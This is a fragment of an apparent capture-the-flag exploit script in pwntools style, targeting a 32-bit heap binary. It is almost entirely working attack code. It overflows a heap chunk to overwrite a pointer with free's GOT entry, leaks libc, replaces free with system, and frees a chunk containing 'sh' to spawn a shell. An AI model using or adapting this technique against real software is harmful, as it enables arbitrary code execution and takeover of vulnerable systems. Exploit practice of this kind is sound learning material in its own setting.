...
'''
def add(size,name,length,content='a'):
    cmd(0)
    sla(":",str(size))
    sla("name:",name)
...
add(0x80,"sh1",0x80,"aaaa") # 0
add(0x80,"sh2",0x80,"aaaa") # 1
add(0x80,"sh3",0x80,"sh\x00") # 2
free(0)
add(0x100,"sh4",0x100,'cccc') # 3
payload = b'a'*0x108 + b"\x00"*4 + b"\x00\x00\x00\x89" + b'a'*0x80 + b"\x00"*4 + b"\x00\x00\x00\x89" + p32(elf.got['free'])
edit(3,0x200,payload)
show(1)

free_addr = l32()
system, binsh = ret2libc(free_addr,"free",libc)
edit(1,0x80,p32(system))
free(2)
